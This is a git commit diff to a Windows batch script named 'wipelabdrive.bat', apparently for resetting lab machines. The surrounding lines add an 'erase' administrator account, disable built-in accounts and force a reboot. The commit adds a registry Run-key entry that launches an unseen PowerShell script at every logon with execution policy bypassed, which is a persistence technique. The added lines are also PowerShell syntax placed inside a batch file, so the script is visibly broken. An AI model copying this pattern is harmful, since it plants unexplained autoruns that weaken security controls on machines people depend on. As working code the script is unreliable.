0169b129aeff375e5515f29910d3c2f9a05a3595
cs947939 <sufam5@outlook.com>
2025-03-23 12:21:35 -0500

    Update wipelabdrive.bat

--- wipelabdrive.bat
+++ wipelabdrive.bat
@@ -4,5 +4,8 @@ net localgroup Administrators erase /add
 net user ls /active:no
 net user Administrator /active:no
 net user UWF-Admin /active:no
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" `
+                 -Name "TempSetup" `
+                 -Value "powershell.exe -ExecutionPolicy Bypass -File C:\scripts\runme.ps1"
 Powershell -ExecutionPolicy Bypass -File "C:\undosetup.ps1"
 shutdown -r -f -t 0
